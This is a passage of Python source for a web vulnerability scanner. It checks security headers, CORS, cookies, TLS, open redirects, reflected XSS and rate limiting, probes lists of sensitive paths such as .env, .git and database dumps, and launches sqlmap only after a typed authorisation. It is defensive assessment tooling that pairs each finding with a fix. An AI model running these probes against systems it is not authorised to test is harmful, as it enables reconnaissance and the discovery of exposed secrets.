            "Add 'includeSubDomains' to protect all subdomains.",
        ))


def _check_security_headers(response: Any, issues: list["Issue"]) -> None:
    """Check all expected security response headers."""
    for header_name, severity, detail, fix in SECURITY_HEADERS:
        if not response.headers.get(header_name):
            issues.append(Issue(severity, "Security Headers",
                                f"Missing header: {header_name}",
                                detail, fix))
    _check_hsts_config(response, issues)


def _check_server_disclosure(response: Any, issues: list["Issue"]) -> None:
    """Flag headers that reveal server software or version info."""
    targets = [
        ("Server",           "Server software/version disclosed"),
        ("X-Powered-By",     "Backend framework disclosed"),
        ("X-AspNet-Version", "ASP.NET version number disclosed"),
        ("X-Generator",      "CMS/generator name disclosed"),
        ("X-Drupal-Cache",   "Drupal CMS presence disclosed"),
    ]
    for header, title in targets:
        value = response.headers.get(header)
        if value:
            issues.append(Issue(
                SEV_INFO, "Information Disclosure",
                title,
                f"{header}: {value}",
                f"Remove or genericize the '{header}' header in your server config.",
            ))


def _check_cors(response: Any, issues: list["Issue"]) -> None:
    """Detect overly permissive CORS configuration."""
    acao = response.headers.get("Access-Control-Allow-Origin", "")
    acac = response.headers.get("Access-Control-Allow-Credentials", "").lower()

    if acao == "*" and acac == "true":
        issues.append(Issue(
            SEV_CRITICAL, "CORS",
            "CORS wildcard origin + credentials enabled",
            ("Access-Control-Allow-Origin: *  with  Access-Control-Allow-Credentials: true "
             "lets any site make credentialed requests -- session hijack risk."),
            "Never combine wildcard origin with credentials. "
            "Explicitly whitelist trusted origins instead.",
        ))
    elif acao == "*":
        issues.append(Issue(
            SEV_MEDIUM, "CORS",
            "CORS wildcard origin (*) configured",
            "Any website can make unauthenticated cross-origin requests to this server.",
            "Restrict to: Access-Control-Allow-Origin: https://yourdomain.com",
        ))


def _check_cookies(response: Any, issues: list["Issue"]) -> None:
    """Inspect Set-Cookie headers for missing security flags."""
    # Try to get the raw list of Set-Cookie headers (handles multiple cookies)
    try:
        cookie_list = response.raw.headers.getlist("Set-Cookie")
    except AttributeError:
        raw = response.headers.get("Set-Cookie", "")
        cookie_list = [raw] if raw else []

    for cookie_str in cookie_list:
        cookie_name  = cookie_str.split("=")[0].strip()
        cookie_upper = cookie_str.upper()
        for flag, severity, detail in COOKIE_FLAGS:
            if flag.upper() not in cookie_upper:
                issues.append(Issue(
                    severity, "Cookie Security",
                    f"Cookie '{cookie_name}' missing '{flag}' flag",
                    detail,
                    f"Set-Cookie: {cookie_name}=...; {flag}",
                ))


def _check_http_methods(url: str, session: Any, issues: list["Issue"]) -> None:
    """
    Send an OPTIONS request and flag any dangerous HTTP methods the
    server advertises (TRACE, CONNECT, DELETE, PUT, PATCH).
    """
    try:
        resp = session.options(url, timeout=8)
        allow = (resp.headers.get("Allow", "") or
                 resp.headers.get("Access-Control-Allow-Methods", ""))
        if not allow:
            return
        allowed = {m.strip().upper() for m in allow.split(",")}
        found   = allowed & DANGEROUS_METHODS
        for method in sorted(found):
            sev = SEV_HIGH if method in {"TRACE", "CONNECT"} else SEV_MEDIUM
            issues.append(Issue(
                sev, "HTTP Methods",
                f"Dangerous HTTP method exposed: {method}",
                f"Server OPTIONS response includes '{method}' in Allow: {allow.strip()}",
                f"Disable {method} in your web server config unless explicitly required.",
            ))
    except Exception:
        pass    # OPTIONS may simply not be supported


def _check_open_redirect(base_url: str, session: Any, issues: list["Issue"]) -> None:
    """
    Test redirect parameter names for open redirect vulnerabilities.
    Progress is shown as dots so the user can see work happening.

    Uses urllib.parse to append parameters correctly so the test works
    even if base_url already contains query parameters (e.g. ?q=test).
    A naive f-string like f"{base_url}?{param}=..." would produce an
    invalid double-? URL in that case and every test would silently fail.
    """
    import urllib.parse
    print(f"\n  Testing {len(REDIRECT_PARAMS)} redirect parameters", end="", flush=True)

    # Parse the base URL once so we can safely append params to it
    parsed = urllib.parse.urlparse(base_url)

    for param in REDIRECT_PARAMS:
        # Build a clean query string that appends to any existing params
        existing_params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        existing_params[param] = [OPEN_REDIRECT_PAYLOAD]
        new_query  = urllib.parse.urlencode(existing_params, doseq=True)
        test_url   = urllib.parse.urlunparse(parsed._replace(query=new_query))

        try:
            resp      = session.get(test_url, timeout=6, allow_redirects=True)
            final_url = resp.url
            print(".", end="", flush=True)
            if OPEN_REDIRECT_PAYLOAD in final_url:
                issues.append(Issue(
                    SEV_CRITICAL, "Open Redirect",
                    f"Open redirect via ?{param}= parameter",
                    f"Injecting {OPEN_REDIRECT_PAYLOAD} into ?{param}= "
                    f"redirected to: {final_url}",
                    "Validate redirect destinations server-side. "
                    "Only redirect to whitelisted internal paths.",
                ))
        except Exception:
            print("?", end="", flush=True)

    print()  # newline after progress dots


# ── New scanner constants ─────────────────────────────────────────────────────

# Sensitive paths to probe: (path, severity, description)
SENSITIVE_PATHS = [
    # Environment and secrets
    ("/.env",               SEV_CRITICAL, "Environment file -- often holds DB passwords, API keys, secrets"),
    ("/.env.local",         SEV_CRITICAL, "Local environment override file exposed"),
    ("/.env.production",    SEV_CRITICAL, "Production environment file exposed"),
    ("/.env.backup",        SEV_CRITICAL, "Backup environment file exposed"),
    # Git repository
    ("/.git/HEAD",          SEV_CRITICAL, "Git HEAD exposed -- full source code may be recoverable via git clone"),
    ("/.git/config",        SEV_CRITICAL, "Git config exposed -- reveals remote URLs and committer info"),
    # CMS / framework config
    ("/wp-config.php",      SEV_CRITICAL, "WordPress config exposed -- contains DB credentials"),
    ("/configuration.php",  SEV_HIGH,     "Joomla configuration file exposed"),
    ("/config.php",         SEV_HIGH,     "PHP config file exposed"),
    ("/config.json",        SEV_HIGH,     "JSON config file exposed"),
    ("/web.config",         SEV_HIGH,     "IIS web.config exposed -- may contain credentials and settings"),
    ("/settings.py",        SEV_HIGH,     "Django/Python settings file exposed"),
    # Database and backup dumps
    ("/backup.zip",         SEV_CRITICAL, "Backup archive exposed"),
    ("/backup.tar.gz",      SEV_CRITICAL, "Backup archive exposed"),
    ("/backup.sql",         SEV_CRITICAL, "SQL database backup exposed"),
    ("/database.sql",       SEV_CRITICAL, "SQL database dump exposed"),
    ("/dump.sql",           SEV_CRITICAL, "SQL dump file exposed"),
    ("/db.sql",             SEV_CRITICAL, "SQL database file exposed"),
    # PHP diagnostic pages
    ("/phpinfo.php",        SEV_HIGH,     "PHP info page -- reveals full server, PHP, and extension config"),
    ("/info.php",           SEV_HIGH,     "PHP info page exposed"),
    ("/test.php",           SEV_MEDIUM,   "PHP test file exposed"),
    # Apache / nginx server status
    ("/server-status",      SEV_HIGH,     "Apache mod_status -- shows live request details and client IPs"),
    ("/server-info",        SEV_MEDIUM,   "Apache mod_info -- reveals loaded modules and directives"),
    ("/.htaccess",          SEV_MEDIUM,   "Apache .htaccess exposed -- reveals URL rewrite rules"),
    # Admin panels
    ("/admin",              SEV_MEDIUM,   "Admin path is accessible"),
    ("/admin/",             SEV_MEDIUM,   "Admin panel directory accessible"),
    ("/administrator/",     SEV_MEDIUM,   "Administrator panel accessible (Joomla default)"),
    ("/wp-admin/",          SEV_MEDIUM,   "WordPress admin panel accessible"),
    ("/wp-login.php",       SEV_LOW,      "WordPress login page exposed"),
    ("/phpmyadmin/",        SEV_HIGH,     "phpMyAdmin exposed -- direct browser-based database access"),
    ("/phpmyadmin",         SEV_HIGH,     "phpMyAdmin exposed"),
    ("/pma/",               SEV_HIGH,     "phpMyAdmin (pma alias) exposed"),
    # Spring Boot actuator endpoints
    ("/actuator",           SEV_HIGH,     "Spring Boot Actuator root -- internal metrics and app state"),
    ("/actuator/env",       SEV_CRITICAL, "Spring Boot /actuator/env -- all environment variables exposed"),
    ("/actuator/mappings",  SEV_HIGH,     "Spring Boot /actuator/mappings -- all routes/controllers exposed"),
    ("/actuator/health",    SEV_INFO,     "Spring Boot /actuator/health -- app health info exposed"),
    # API documentation
    ("/swagger.json",       SEV_INFO,     "Swagger API docs exposed -- full API surface discoverable"),
    ("/swagger-ui.html",    SEV_INFO,     "Swagger UI exposed"),
    ("/swagger-ui/",        SEV_INFO,     "Swagger UI directory accessible"),
    ("/api/swagger.json",   SEV_INFO,     "API Swagger docs exposed"),
    ("/v2/api-docs",        SEV_INFO,     "Swagger v2 API docs exposed"),
    ("/api-docs",           SEV_INFO,     "API documentation exposed"),
    # Misc
    ("/.DS_Store",          SEV_LOW,      "macOS .DS_Store metadata -- may reveal directory filenames"),
    ("/crossdomain.xml",    SEV_LOW,      "Adobe crossdomain policy present -- review allowed origins"),
]

# Directory paths to check for directory listing
COMMON_DIRECTORIES = [
    "/uploads/", "/upload/", "/files/", "/file/", "/backup/",
    "/backups/", "/images/", "/img/", "/static/", "/assets/",
    "/media/", "/logs/", "/log/", "/tmp/", "/temp/", "/cache/",
    "/data/", "/downloads/", "/export/", "/exports/",
]

# Response content signatures that indicate directory listing is on
DIR_LISTING_SIGNATURES = [
    "index of /", "directory listing for",
    "<title>index of", "parent directory",
    "[to parent directory]", "last modified</a>",
]

# WAF / CDN detection: header name -> product name
WAF_SIGNATURES = {
    "CF-RAY":                 "Cloudflare",
    "CF-Cache-Status":        "Cloudflare",
    "X-Sucuri-ID":            "Sucuri WAF",
    "X-Sucuri-Cache":         "Sucuri WAF",
    "X-Mod-Security-ID":      "ModSecurity WAF",
    "X-Iinfo":                "Imperva Incapsula",
    "X-CDN":                  "CDN / WAF layer",
    "X-Akamai-Transformed":   "Akamai",
    "Akamai-Cache-Status":    "Akamai",
    "X-Varnish":              "Varnish cache",
    "X-HW":                   "Huawei CDN",
    "x-amzn-requestid":       "AWS infrastructure",
    "X-Azure-Ref":            "Azure Front Door",
}

# Keywords in robots.txt Disallow paths that suggest sensitive locations
ROBOTS_SENSITIVE_KEYWORDS = [
    "admin", "backup", "config", "database", "db", "dump", "env",
    "secret", "private", "hidden", "internal", "staging", "dev",
    "test", "tmp", "temp", "cache", "log", "upload", "phpmyadmin",
    "wp-admin", "administrator", "console", "dashboard", "panel",
    "api", "auth", "login", "signin", "password", "credential",
]


# ── New check functions ───────────────────────────────────────────────────────

def _check_ssl_tls(url: str, issues: list["Issue"]) -> None:
    """
    Inspect the SSL/TLS certificate and negotiated connection settings.

    Checks:
      - Certificate expiry (CRITICAL < 14 days, HIGH < 30 days)
      - Deprecated protocol versions (TLS 1.0/1.1 = HIGH, SSLv2/3 = CRITICAL)
      - Weak cipher suites (RC4, DES, NULL, EXPORT, ANON, MD5, 3DES)
      - Short cipher key length (< 128 bits)
      - Certificate validation failures (self-signed, hostname mismatch)

    Only runs on HTTPS targets; skips silently for HTTP.
    Uses Python's built-in ssl module -- no extra dependencies.
    """
    import ssl
    import socket
    import urllib.parse

    parsed = urllib.parse.urlparse(url)
    if parsed.scheme != "https":
        return   # no certificate on plain HTTP

    hostname = parsed.hostname
    port     = parsed.port or 443

    # ── Attempt verified connection ───────────────────────────────────
    try:
        context = ssl.create_default_context()
        with socket.create_connection((hostname, port), timeout=8) as sock:
            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                cert        = ssock.getpeercert()
                tls_version = ssock.version()
                cipher_info = ssock.cipher()   # (name, protocol, bits)

    except ssl.SSLCertVerificationError as e:
        err = str(e).lower()
        if "hostname" in err:
            issues.append(Issue(
                SEV_CRITICAL, "SSL/TLS",
                "Certificate hostname mismatch",
                f"Certificate is not valid for '{hostname}': {e}",
                "Reissue the certificate with a Subject Alternative Name covering this hostname.",
            ))
        else:
            issues.append(Issue(
                SEV_CRITICAL, "SSL/TLS",
                "Certificate validation failed (possibly self-signed or untrusted CA)",
                str(e),
                "Replace with a certificate signed by a trusted CA (e.g. Let's Encrypt).",
            ))
        return

    except OSError:
        return  # port unreachable -- already flagged by _check_https

    except Exception as e:
        issues.append(Issue(SEV_INFO, "SSL/TLS", "SSL inspection error", str(e)))
        return

    # ── Certificate expiry ────────────────────────────────────────────
    expire_str = cert.get("notAfter", "")
    if expire_str:
        try:
            expire_dt = datetime.datetime.strptime(expire_str, "%b %d %H:%M:%S %Y %Z")
            days_left = (expire_dt - datetime.datetime.utcnow()).days
            if days_left < 0:
                issues.append(Issue(
                    SEV_CRITICAL, "SSL/TLS",
                    f"Certificate EXPIRED {abs(days_left)} days ago",
                    f"Expired: {expire_str}",
                    "Renew the certificate immediately -- browsers are blocking this site.",
                ))
            elif days_left < 14:
                issues.append(Issue(
                    SEV_CRITICAL, "SSL/TLS",
                    f"Certificate expires in {days_left} days",
                    f"Expiry: {expire_str}",
                    "Renew immediately -- certificate expires very soon.",
                ))
            elif days_left < 30:
                issues.append(Issue(
                    SEV_HIGH, "SSL/TLS",
                    f"Certificate expires in {days_left} days",
                    f"Expiry: {expire_str}",
                    "Renew the certificate soon to avoid service interruption.",
                ))
        except ValueError:
            pass

    # ── TLS protocol version ──────────────────────────────────────────
    deprecated = {
        "SSLv2":  SEV_CRITICAL,
        "SSLv3":  SEV_CRITICAL,
        "TLSv1":  SEV_HIGH,
        "TLSv1.1": SEV_HIGH,
    }
    if tls_version in deprecated:
        issues.append(Issue(
            deprecated[tls_version], "SSL/TLS",
            f"Deprecated protocol negotiated: {tls_version}",
            f"TLS 1.0 and 1.1 are deprecated per RFC 8996. SSLv2/3 are critically broken.",
            "Configure server to offer TLS 1.2 minimum; prefer TLS 1.3.",
        ))

    # ── Cipher suite weakness ─────────────────────────────────────────
    if cipher_info:
        cipher_name = cipher_info[0].upper()
        bits        = cipher_info[2] or 0
        weak_kws    = ["RC4", "DES", "NULL", "EXPORT", "ANON", "3DES"]
        for kw in weak_kws:
            if kw in cipher_name:
                issues.append(Issue(
                    SEV_HIGH, "SSL/TLS",
                    f"Weak cipher suite negotiated: {cipher_info[0]}",
                    f"Cipher: {cipher_info[0]}, Protocol: {cipher_info[1]}, Key bits: {bits}",
                    "Restrict to AEAD cipher suites: AES-GCM or ChaCha20-Poly1305.",
                ))
                break
        if bits and bits < 128:
            issues.append(Issue(
                SEV_HIGH, "SSL/TLS",
                f"Cipher key length too short: {bits} bits",
                f"Cipher: {cipher_info[0]}",
                "Use cipher suites with at least 128-bit symmetric key length.",
            ))


def _random_user_agent(tool_name: str) -> str:
    """Return a randomized user-agent when fake-useragent is installed."""
    fallback = f"Argus-{tool_name}/{APP_VERSION} (authorized testing)"
    try:
        from fake_useragent import UserAgent
        return UserAgent().random
    except Exception:
        return fallback


def _check_tech_stack(url: str, response: Any, issues: list["Issue"]) -> None:
    """Fingerprint visible technologies with wappalyzer-python when present."""
    try:
        from Wappalyzer import Wappalyzer, WebPage
    except ImportError:
        print("\n  [!] wappalyzer-python is not installed.  Run:  pip install wappalyzer-python")
        return

    try:
        wappalyzer = Wappalyzer.latest()
        try:
            webpage = WebPage.new_from_response(response)
        except Exception:
            webpage = WebPage.new_from_url(url)
        technologies = wappalyzer.analyze(webpage)
    except Exception as e:
        issues.append(Issue(SEV_INFO, "Technology Fingerprint", "Wappalyzer error", str(e)))
        return

    if isinstance(technologies, dict):
        names = sorted(technologies.keys())
    else:
        names = sorted(technologies)

    if names:
        issues.append(Issue(
            SEV_INFO, "Technology Fingerprint",
            f"Detected technologies: {', '.join(names[:12])}",
            f"{len(names)} technologies detected by Wappalyzer.",
            "Use stack-specific hardening checks for the detected CMS, framework, CDN, and libraries.",
        ))


def _run_sslyze_scan(url: str, issues: list["Issue"]) -> None:
    """Run SSLyze CLI for deeper TLS checks when installed."""
    import urllib.parse

    parsed = urllib.parse.urlparse(url)
    if parsed.scheme != "https":
        return
    hostname = parsed.hostname
    port = parsed.port or 443
    if not hostname:
        return

    sslyze_bin = shutil.which("sslyze")
    cmd = [sslyze_bin, "--regular", f"{hostname}:{port}"] if sslyze_bin else [
        sys.executable, "-m", "sslyze", "--regular", f"{hostname}:{port}"
    ]

    print(f"\n  [*] Running SSLyze deep TLS scan for {hostname}:{port} ...")
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=240,
        )
    except FileNotFoundError:
        print("  [!] SSLyze is not installed.  Run:  pip install sslyze")
        return
    except subprocess.TimeoutExpired:
        issues.append(Issue(
            SEV_INFO, "SSLyze",
            "SSLyze scan timed out",
            "The deep TLS scan did not finish within 240 seconds.",
        ))
        return

    output = (result.stdout or "") + "\n" + (result.stderr or "")
    lower = output.lower()
    if result.returncode != 0:
        issues.append(Issue(
            SEV_INFO, "SSLyze",
            "SSLyze returned an error",
            output[:1200] or "No output captured.",
            "Confirm SSLyze is installed and try: sslyze --regular host:443",
        ))
        return

    for keyword, title in (
        ("heartbleed", "Heartbleed check reported vulnerable"),
        ("robot", "ROBOT check reported vulnerable"),
    ):
        matching_lines = [ln.strip() for ln in output.splitlines() if keyword in ln.lower()]
        risky = [ln for ln in matching_lines if "vulnerable" in ln.lower() and "not vulnerable" not in ln.lower()]
        if risky:
            issues.append(Issue(
                SEV_HIGH, "SSLyze",
                title,
                "; ".join(risky[:3]),
                "Review the SSLyze output and update the TLS stack/configuration.",
            ))

    if "certificate chain" in lower and ("failed" in lower or "error" in lower):
        issues.append(Issue(
            SEV_HIGH, "SSLyze",
            "Certificate chain issue reported by SSLyze",
            output[:1200],
            "Install a complete, trusted certificate chain on the server.",
        ))

    issues.append(Issue(
        SEV_INFO, "SSLyze",
        "SSLyze deep TLS scan completed",
        output[:1200] if output else "SSLyze completed without console output.",
        "Review full SSLyze output for supported protocols, ciphers, resumption, and certificate details.",
    ))


def _run_sqlmap_assisted_scan(url: str, issues: list["Issue"]) -> None:
    """
    Launch sqlmap only after explicit authorization confirmation.

    Kept at level/risk 1 with --smart so it is useful for owner testing
    without turning the scanner's normal run-all path into an aggressive test.
    """
    print("\n  [!] sqlmap sends active SQL injection probes.")
    print("      Only run it against applications you own or are authorized to test.")
    confirm = input("      Type AUTHORIZED to launch sqlmap, or press Enter to skip: ").strip()
    if confirm != "AUTHORIZED":
        print("  [*] sqlmap skipped.")
        return

    sqlmap_bin = shutil.which("sqlmap") or shutil.which("sqlmap.py")
    if not sqlmap_bin:
        print("  [!] sqlmap not found on PATH. Install from https://sqlmap.org/")
        return

    cmd = [
        sqlmap_bin,
        "-u", url,
        "--batch",
        "--forms",
        "--crawl=1",
        "--level=1",
        "--risk=1",
        "--smart",
    ]
    print("  [*] Running sqlmap with level=1 risk=1 --smart ...")
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=600,
        )
    except subprocess.TimeoutExpired:
        issues.append(Issue(
            SEV_INFO, "sqlmap",
            "sqlmap timed out",
            "sqlmap did not finish within 10 minutes.",
        ))
        return

    output = (result.stdout or "") + "\n" + (result.stderr or "")
    lower = output.lower()
    if "is vulnerable" in lower or "sql injection" in lower and "parameter" in lower:
        issues.append(Issue(
            SEV_HIGH, "sqlmap",
            "Potential SQL injection reported by sqlmap",
            output[-2000:],
            "Review sqlmap's full output, reproduce manually, and parameterize database queries.",
        ))
    else:
        issues.append(Issue(
            SEV_INFO, "sqlmap",
            "sqlmap completed",
            output[-1200:] if output else "No SQL injection reported in captured output.",
        ))


def _check_http_to_https_redirect(url: str, session: Any, issues: list["Issue"]) -> None:
    """
    Verify that the HTTP version of the target redirects to HTTPS.

    A 301 permanent redirect is ideal.  A non-HTTPS redirect destination
    or a 200 response on HTTP are both flagged as HIGH -- it means users
    who type the domain without 'https://' land on an unencrypted page.

    Skipped if the target is already plain HTTP.
    """
    import urllib.parse

    parsed = urllib.parse.urlparse(url)
    if parsed.scheme != "https":
        return   # target is already HTTP -- no redirect to verify

    http_url = parsed._replace(scheme="http").geturl()

    try:
        resp     = session.get(http_url, timeout=8, allow_redirects=False)
        location = resp.headers.get("Location", "")

        if resp.status_code in (301, 302, 307, 308):
            if location.startswith("https://"):
                if resp.status_code != 301:
                    issues.append(Issue(
                        SEV_LOW, "Transport",
                        f"HTTP redirects to HTTPS via {resp.status_code} instead of 301",
                        f"HTTP {resp.status_code} -> {location}",
                        "Use a 301 (permanent) redirect so browsers and crawlers cache it.",
                    ))
                # else: 301 -> HTTPS is correct, no issue
            else:
                issues.append(Issue(
                    SEV_HIGH, "Transport",
                    "HTTP redirect does not point to HTTPS",
                    f"HTTP {resp.status_code} redirects to: {location}",
                    "Ensure the redirect destination uses https://.",
                ))
        elif resp.status_code == 200:
            issues.append(Issue(
                SEV_HIGH, "Transport",
                "HTTP version serves content -- no redirect to HTTPS",
                "Browsing http:// returns a 200 response. Users on plain HTTP get no protection.",
                "Add a 301 redirect for all HTTP traffic to the HTTPS equivalent.",
            ))

    except Exception:
        pass   # HTTP may simply be unreachable -- not an issue


def _check_sensitive_paths(base_url: str, session: Any, issues: list["Issue"]) -> None:
    """
    Probe a list of commonly exposed sensitive files and directories.

    HTTP 200  = path is openly accessible          → flagged at listed severity
    HTTP 403/401 = path exists but is restricted   → flagged one severity level lower
    Anything else = not found, no issue raised

    Covers: env files, git repositories, CMS configs, DB dumps, backup archives,
    PHP diagnostic pages, admin panels, Spring Boot actuator, API docs, and more.
    """
    import urllib.parse

    origin = "{0}://{1}".format(*urllib.parse.urlparse(base_url)[:2])
    print(f"\n  Probing {len(SENSITIVE_PATHS)} sensitive paths", end="", flush=True)

    for path, severity, description in SENSITIVE_PATHS:
        target = origin + path
        try:
            resp = session.get(target, timeout=5, allow_redirects=False)
            print(".", end="", flush=True)

            if resp.status_code == 200:
                issues.append(Issue(
                    severity, "Sensitive Paths",
                    f"Exposed: {path}",
                    description,
                    f"Remove the file or restrict access to '{path}' in your server config.",
                ))
            elif resp.status_code in (401, 403):
                # Path exists but is protected -- flag one level lower
                idx       = SEV_ORDER.index(severity)
                lower_sev = SEV_ORDER[min(idx + 1, len(SEV_ORDER) - 1)]
                issues.append(Issue(
                    lower_sev, "Sensitive Paths",
                    f"Exists but access-controlled (HTTP {resp.status_code}): {path}",
                    f"{description}  Path returned {resp.status_code} -- it exists on the server.",
                    f"If '{path}' is not needed, remove it entirely rather than just blocking access.",
                ))
        except Exception:
            print("?", end="", flush=True)

    print()


def _check_robots_txt(base_url: str, session: Any, issues: list["Issue"]) -> None:
    """
    Fetch robots.txt and flag sensitive paths disclosed in Disallow entries.

    robots.txt is publicly readable by design, so listing secret admin panels
    or staging directories there effectively advertises their existence to
    attackers.  This check parses every Disallow entry and flags any that
    match known sensitive-sounding keywords.
    """
    import urllib.parse

    parsed    = urllib.parse.urlparse(base_url)
    robots_url = f"{parsed.scheme}://{parsed.netloc}/robots.txt"

    try:
        resp = session.get(robots_url, timeout=6, allow_redirects=True)
        if resp.status_code != 200:
            return

        disallowed = []
        for raw_line in resp.text.splitlines():
            line = raw_line.strip()
            if line.lower().startswith("disallow:"):
                path = line.split(":", 1)[1].strip()
                if path and path != "/":
                    disallowed.append(path)

        if not disallowed:
            return

        # Flag entries that match sensitive keywords
        for path in disallowed:
            path_lower = path.lower()
            for kw in ROBOTS_SENSITIVE_KEYWORDS:
                if kw in path_lower:
                    issues.append(Issue(
                        SEV_INFO, "Robots.txt",
                        f"Sensitive path disclosed in robots.txt: {path}",
                        "robots.txt is public. Listing this path reveals its existence to everyone.",
                        "Security through obscurity is not a control. "
                        "Remove the entry if the resource is truly sensitive.",
                    ))
                    break   # one issue per path

        # Flag if the sheer volume of entries reveals significant site structure
        if len(disallowed) > 15:
            issues.append(Issue(
                SEV_INFO, "Robots.txt",
                f"robots.txt contains {len(disallowed)} Disallow entries -- site structure exposed",
                "A large robots.txt maps out significant portions of the site.",
                "Review whether all listed paths need to be advertised.",
            ))

    except Exception:
        pass


def _check_directory_listing(base_url: str, session: Any, issues: list["Issue"]) -> None:
    """
    Check common directories for enabled directory listing.

    When a web server has directory listing enabled, any visitor can browse
    folder contents like a file manager.  This is especially dangerous for
    directories like /uploads/, /backup/, /logs/, and /tmp/ where sensitive
    files may have accumulated.

    Detection: looks for well-known 'Index of /' signatures in 200 responses.
    """
    import urllib.parse

    origin = "{0}://{1}".format(*urllib.parse.urlparse(base_url)[:2])
    print(f"\n  Checking {len(COMMON_DIRECTORIES)} directories for listing", end="", flush=True)

    HIGH_RISK_DIRS = {"upload", "backup", "log", "tmp", "temp", "data", "export", "download"}

    for directory in COMMON_DIRECTORIES:
        target = origin + directory
        try:
            resp = session.get(target, timeout=5, allow_redirects=True)
            print(".", end="", flush=True)

            if resp.status_code == 200:
                snippet = resp.text[:3000].lower()
                if any(sig in snippet for sig in DIR_LISTING_SIGNATURES):
                    is_high = any(kw in directory for kw in HIGH_RISK_DIRS)
                    issues.append(Issue(
                        SEV_HIGH if is_high else SEV_MEDIUM,
                        "Directory Listing",
                        f"Directory listing enabled: {directory}",
                        f"Browsing {target} returns a file index. All contents are enumerable.",
                        "Disable directory listing. Apache: 'Options -Indexes'  "
                        "Nginx: 'autoindex off;'",
                    ))
        except Exception:
            print("?", end="", flush=True)

    print()


def _check_reflected_xss(url: str, session: Any, issues: list["Issue"]) -> None:
    """
    Probe query parameters for reflected XSS by injecting a unique marker
    and checking whether it appears unescaped in the response body.

    Only tests parameters present in the supplied URL.  If none exist,
    the page is fetched once to look for linked URLs that carry parameters.
    Up to 5 parameters are tested per run.
    """
    import urllib.parse as _up

    XSS_MARKER = "<argus-xss-probe-7f3a>"
    SAFE_MARKER = XSS_MARKER.replace("<", "&lt;").replace(">", "&gt;")

    parsed = _up.urlparse(url)
    params = _up.parse_qs(parsed.query, keep_blank_values=True)

    # No params in the base URL — scan page for links that have them
    if not params:
        try:
            resp = session.get(url, timeout=6, allow_redirects=True)
            found = re.findall(r'href=["\']([^"\']*\?[^"\'>]+)["\']', resp.text)
            if found:
                candidate = _up.urljoin(resp.url, found[0])
                parsed   = _up.urlparse(candidate)
                params   = _up.parse_qs(parsed.query, keep_blank_values=True)
        except Exception:
            pass

    if not params:
        issues.append(Issue(
            SEV_INFO, "Reflected XSS",
            "No query parameters found to test",
            "The target URL and its linked pages carry no query parameters, "
            "so reflected XSS via URL parameters could not be probed.",
            "Test POST forms and JSON endpoints manually with a browser proxy.",
        ))
        return

    print(f"  [*] Probing {min(len(params), 5)} parameter(s) for reflected XSS ...", flush=True)
    reflected_raw    = []   # unescaped — actual finding
    reflected_escaped = []  # HTML-escaped — low risk

    for param in list(params.keys())[:5]:
        test_params          = {k: v[:] for k, v in params.items()}
        test_params[param]   = [XSS_MARKER]
        test_query = _up.urlencode(test_params, doseq=True)
        test_url   = _up.urlunparse(parsed._replace(query=test_query))
        try:
            r = session.get(test_url, timeout=6, allow_redirects=True)
            body = r.text
            if XSS_MARKER in body:
                reflected_raw.append(param)
            elif SAFE_MARKER in body:
                reflected_escaped.append(param)
        except Exception:
            continue

    if reflected_raw:
        issues.append(Issue(
            SEV_HIGH, "Reflected XSS",
            f"Marker reflected unescaped in: {', '.join(reflected_raw)}",
            f"The string {XSS_MARKER!r} was returned verbatim in the response body "
            f"for parameter(s): {', '.join(reflected_raw)}. "
            "An attacker can inject arbitrary HTML/JS into victims\' browsers.",
            "HTML-encode all user-supplied input before rendering it in responses. "
            "Apply a strict Content-Security-Policy to limit script execution.",
        ))
    if reflected_escaped:
        issues.append(Issue(
            SEV_LOW, "Reflected XSS (escaped)",
            f"Marker reflected HTML-escaped in: {', '.join(reflected_escaped)}",
            f"Input was reflected but HTML-encoded ({SAFE_MARKER!r}). "
            "This is correct behaviour; verify it holds for all rendering contexts "
            "(JS strings, attribute values, JSON responses).",
            "Confirm encoding is applied consistently in all output contexts.",
        ))
    if not reflected_raw and not reflected_escaped:
        issues.append(Issue(
            SEV_INFO, "Reflected XSS",
            f"No reflection detected across {min(len(params), 5)} parameter(s)",
            "The injected marker was not found in any response. "
            "This does not rule out DOM-based or stored XSS.",
            "Test POST bodies, JSON endpoints, and stored paths manually.",
        ))


def _check_rate_limiting(url: str, session: Any, response: Any, issues: list["Issue"]) -> None:
    """
    Detect whether the server enforces rate limiting.

    Step 1: look for standard rate-limit headers in the initial response.
            If found, rate limiting is active -- no further testing needed.
    Step 2: if no headers found, send a small burst (15 rapid requests)
            and check whether any return 429 Too Many Requests.

    Missing rate limiting is most critical on login and API endpoints but
    is worth flagging on any public surface.
    """
    RATE_LIMIT_HEADERS = [
        "X-RateLimit-Limit", "X-RateLimit-Remaining", "X-RateLimit-Reset",
        "RateLimit-Limit",   "RateLimit-Remaining",   "RateLimit-Reset",
        "Retry-After",
    ]

    # Step 1 -- headers already present in the initial response
    found_headers = [h for h in RATE_LIMIT_HEADERS if response.headers.get(h)]
    if found_headers:
        return   # rate limiting is in place, no issue

    # Step 2 -- burst test
    print(f"\n  Burst-testing rate limiting (15 requests)", end="", flush=True)
    got_429 = False
    for _ in range(15):
        try:
            r = session.get(url, timeout=4)
            print(".", end="", flush=True)
            if r.status_code == 429:
                got_429 = True
                break
        except Exception:
            break
        time.sleep(0.05)   # avoid WAF self-block during burst test
    print()

    if not got_429:
        issues.append(Issue(
            SEV_MEDIUM, "Rate Limiting",
            "No rate limiting detected after 15 rapid requests",
            "No rate-limit response headers were found and 15 rapid requests produced no 429. "
            "Brute-force and enumeration attacks are easier without throttling.",
            "Implement rate limiting (e.g. nginx limit_req, Express rate-limit, Cloudflare rules). "
            "Apply stricter limits to login, password-reset, and API endpoints.",
        ))


def _check_waf_detection(response: Any, issues: list["Issue"]) -> None:
    """
    Detect WAF / CDN presence from response headers.

    A detected WAF is logged as INFO (it's a positive sign, not a finding).
    No WAF detected is logged as LOW -- the origin server may be directly
    exposed to attack traffic with no filtering layer in front of it.
    """
    detected = []
    for header, product in WAF_SIGNATURES.items():
        if response.headers.get(header):
            if product not in detected:
                detected.append(product)

    # Also check Server header for cloudflare
    server = response.headers.get("Server", "").lower()
    if "cloudflare" in server and "Cloudflare" not in detected:
        detected.append("Cloudflare")

    if detected:
        for product in detected:
            issues.append(Issue(
                SEV_INFO, "WAF / CDN",
                f"WAF / CDN detected: {product}",
                f"Response headers indicate {product} is present. "
                "This provides an additional filtering layer.",
                None,
            ))
